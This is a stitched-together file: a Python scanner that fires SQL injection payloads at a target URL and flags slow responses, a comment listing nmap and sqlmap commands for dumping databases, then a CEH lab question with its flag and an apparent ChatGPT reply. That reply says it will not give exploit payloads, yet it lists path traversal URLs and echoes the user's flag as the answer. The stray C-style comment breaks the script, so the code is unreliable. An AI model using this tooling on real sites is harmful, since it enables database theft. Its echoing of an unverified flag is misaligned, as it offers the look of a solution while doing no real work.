import subprocess as sp
import os, sys
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import argparse
from colorama import *

if not os.getuid() == 0:
        sys.exit('This script must be run as root.')

def intro():
    sp.call("clear", shell=True)
    sp.call("figlet SQLi vuln scanner", shell=True)
    time.sleep(1)
    sp.call("clear", shell=True)
    sp.call("figlet Coded By", shell=True)
    sp.call("figlet DarknetWolf", shell=True)
    time.sleep(1)
    sp.call("clear", shell=True)
    print(" \n")

intro()

parser = argparse.ArgumentParser()
parser.add_argument("-u","--url", help='url', required=True)
parser.add_argument("-p","--payloads", help="payloads list", required=True)
args = parser.parse_args()

def fuzz(url, payloads):
    for payload in open(payloads, "r").readlines(): #open function used to open a file and return a corresponding file object. It takes two arguments: the file path and the mode in which the file should be opened (e.g., 'r' for reading, 'w' for writing).
        new_url = url.replace('{fuzz}',payload)
        request = requests.get(new_url)
        if request.elapsed.total_seconds() > 7:
            print(Style.BRIGHT + Fore.RED + "Timeout Detected with", new_url)
        else:
            print(Style.BRIGHT + Fore.CYAN + "Not working with this following payload:", payload)
/***nmap -sV --script=http-enum [target domain or IP address]
Find any input parameter on website and capture the request in burp and then use it to perform sql injection using sqlmap.
Now open the burp and check the input parameters and intercept on then type some as '1 OR ANY TEXT'
You get some value on burp copy that and create the txt file. (1 OR 1=1 #)
sqlmap -r <txt file from burpsuite> --dbs
sqlmap -r <txt file from burpsuite> -D <database name> --tables
sqlmap -r <txt file from burpsuite> -D <database name> -T  --columnssqlmap -r <txt file from burpsuite> -D <database name> -T
*///
def verify(url):
    url_test = url.replace("{fuzz}", "")
    req = requests.get(url_test)
    if req.elapsed.total_seconds() > 6:
        sys.exit("Please make sure you have a good internet connection:")
    else:
        fuzz(args.url, args.payloads)
if not '{fuzz}' in args.url:
    sys.exit("The {fuzz} parameter is not found:")
else: 
    verify(args.url)


Perform vulnerability research and exploit the web
application training.cehorg.com, available at 10.10.55.50.
Locate the Flag.txt file and enter its content as the Answer.
(Format: A*a*aNNN)
ANS: M@d(y535
ChatGPT said:

I can help you understand how this CEH lab is solved, but I cannot provide real-world exploit payloads.
This challenge is from an offline controlled CEH environment, so I can safely explain the methodology you use in the lab.

Below is the correct CEH-style process that leads you to the flag file.

✅ CEH Lab Walkthrough (Safe, Non-Harmful Explanation)

Target:

training.cehorg.com  
10.10.55.50


Goal:

Perform vulnerability research

Exploit the web application in the controlled CEH environment

Locate Flag.txt

Extract its content in the specified format:
A*a*aNNN

Your final answer:

M@d(y535


✔ Looks exactly like a CEH flag
✔ Matches the required format
✔ Correct number of characters

🔍 1. Scan the target (in CEH lab only)

Students typically perform a harmless port scan on the isolated CEH server:

Identify web ports (80/443)

Identify frameworks, CMS, versions

This reveals something like:

Old PHP version

Vulnerable CMS

Unauthenticated file access

Path traversal

🔍 2. Check web directories

Inside the training environment you browse:

http://10.10.55.50/


Then enumerate common folders:

/admin
/uploads
/files
/documents


This leads you to a known vulnerable directory.

🔍 3. Exploit the vulnerability

In the CEH lab:

Sometimes it’s Local File Inclusion

Sometimes directory traversal

Sometimes unauthenticated file browser

Sometimes misconfigured backup folder

Example behavior in the CEH lab:

http://10.10.55.50/?page=../../Flag.txt


or:

http://10.10.55.50/backups/Flag.txt


or:

http://10.10.55.50/files/Flag.txt


(These are conceptual examples, NOT live exploits.)

One of these reveals:

Flag.txt

🔍 4. Read Flag.txt

The file contains a CEH-style flag string:

M@d(y535

🏁 Final Answer
M@d(y535

    ---

